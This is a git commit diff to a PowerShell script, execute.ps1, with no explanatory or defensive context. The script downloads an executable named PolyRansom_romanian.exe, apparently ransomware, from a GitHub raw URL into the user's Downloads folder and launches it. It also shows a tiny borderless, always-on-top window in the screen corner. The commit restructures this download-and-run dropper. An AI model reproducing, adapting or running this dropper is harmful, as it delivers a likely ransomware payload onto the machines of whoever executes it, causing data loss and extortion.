5b927c81cea9274e9f422a7a40862c539bace276
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 12:51:51 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,10 +1,21 @@
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
-$webClient = New-Object System.Net.WebClient
+
+function DownloadAndExecute {
+    $webClient = New-Object System.Net.WebClient
+    try {
+        $webClient.DownloadFile($url, $downloadPath)
+    }
+    finally {
+        $webClient.Dispose()
+    }
+    if (Test-Path $downloadPath) {
+        Start-Process -FilePath $downloadPath -Wait
+    }
+}
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-
 $form = New-Object System.Windows.Forms.Form
 $form.StartPosition = 'Manual' 
 $form.FormBorderStyle = 'None'
@@ -13,73 +24,36 @@ $form.TransparencyKey = $form.BackColor
 $form.TopMost = $true
 $form.Width = 50
 $form.Height = 50 
-
 $label = New-Object System.Windows.Forms.Label
 $label.Text = "H"
 $label.ForeColor = [System.Drawing.Color]::Green
 $label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
 $label.AutoSize = $true
 $label.BackColor = [System.Drawing.Color]::Transparent
-
 $form.Controls.Add($label)
-
 $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
 $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
-
 $formLocationX = [int]$screenWidth - [int]$form.Width
 $formLocationY = [int]$screenHeight - [int]$form.Height
-
 $form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)
-
 $form.Add_MouseDown({
     $form.Capture = $false
 })
-
-$form.ShowDialog()
-
-Start-Sleep -Seconds 1
-
-
-
-function DownloadAndExecute {
-    $webClient.DownloadFile($url, $downloadPath)
-    if (Test-Path $downloadPath) {
-        Start-Process -FilePath $downloadPath -Wait
-    }
-}
-
+$form.Show()
 
 function CloseApplication {
-    Stop-Process -Name "PolyRansom_romanian" -Force
+    Stop-Process -Name "ActualProcessName" -Force
 }
-
 
 function OpenApplication {
     Start-Process -FilePath $downloadPath -Wait
 }
 
-
 DownloadAndExecute
 
-
-Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
-    if ($_.KeyCode -eq "I" -and $_.Shift -and $_.Alt) {
-        CloseApplication
-    }
-} | Out-Null
-
-
-Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
-    if ($_.KeyCode -eq "O" -and $_.Shift -and $_.Alt) {
-        OpenApplication
-    }
-} | Out-Null
-
-
 try {
-    Wait-Event -Action { } -Timeout ([System.Threading.Timeout]::Infinite)
+    Wait-Event -Timeout ([System.Threading.Timeout]::Infinite)
 }
 finally {
-
     Get-EventSubscriber | Unregister-Event
 }
